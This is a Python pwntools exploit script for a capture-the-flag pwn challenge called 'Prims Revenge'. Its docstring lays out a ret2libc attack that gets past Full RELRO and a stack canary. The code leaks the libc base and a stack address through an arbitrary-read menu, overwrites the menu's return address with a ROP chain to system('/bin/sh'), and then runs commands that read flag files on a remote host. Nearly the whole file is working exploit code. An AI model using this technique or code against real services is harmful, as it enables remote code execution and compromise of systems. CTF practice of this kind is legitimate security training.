#!/usr/bin/env python3
"""
Prims Revenge (CYBERBLITZ 2026, pwn, 409) — arbitrary r/w with Full RELRO + canary.

Same arbread/arbwrite menu as Prims, but Full RELRO closes the GOT and the canary blocks a
stack smash, so the write goes to a return address instead:

  1. arbread GOT[puts]      -> libc base
  2. arbread libc environ   -> a live stack address
  3. scan down from environ for 0x4013fe (main's "return from menu" value) -> menu_ret slot
  4. arbwrite a ret2libc chain over menu_ret..+0x18; when menu returns -> system("/bin/sh")

The remote drops idle stdin after ~1s, so every phase is one buffered send synced with fast
recvuntil, and the final four writes are sent together with the shell command.

Needs the provided libc.so.6.  nc 45.77.247.35 22020   (alt: 5.223.64.53 22020)
"""
import sys, re, time
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

GOT_PUTS = 0x403fb8
RET_MAIN = 0x4013fe          # instruction after `call menu` in main

libc = ELF('./libc.so.6', checksec=False)
PUTS, SYSTEM, ENVIRON = libc.sym['puts'], libc.sym['system'], libc.sym['environ']
BINSH  = next(libc.search(b'/bin/sh\x00'))
POPRDI = next(libc.search(asm('pop rdi; ret'), executable=True))
RET    = next(libc.search(asm('ret'), executable=True))

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ('45.77.247.35', 22020)


def read_batch(io, addrs):
    io.send(b''.join(b'1\n' + p64(a) for a in addrs))
    data = b''
    for _ in addrs:
        data += io.recvuntil(b'option > ')
    return [u64(bytes.fromhex(h.decode()))
            for h in re.findall(rb'arbread: ([0-9a-f]{16})', data)]


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b'option > ')

    base = read_batch(io, [GOT_PUTS])[0] - PUTS
    env  = read_batch(io, [base + ENVIRON])[0]

    offs = list(range(8, 0x400, 8))
    vals = read_batch(io, [env - o for o in offs])
    menu_ret = next((env - o for o, v in zip(offs, vals) if v == RET_MAIN), None)
    log.info('base=%#x env=%#x menu_ret=%s', base, env,
             hex(menu_ret) if menu_ret else None)
    if not menu_ret:
        log.failure('menu return slot not found'); return

    writes = [(menu_ret + 8,  base + BINSH),
              (menu_ret + 16, base + RET),
              (menu_ret + 24, base + SYSTEM),
              (menu_ret,      base + POPRDI)]   # written last -> triggers on menu return
    payload  = b''.join(b'2\n' + p64(a) + p64(v) for a, v in writes)
    payload += b'cat flag* /flag* 2>/dev/null; id; echo ENDMARK\n'
    io.send(payload)
    time.sleep(1)
    print(io.recvrepeat(3).decode('latin1', 'replace'))
    io.close()


if __name__ == '__main__':
    main()
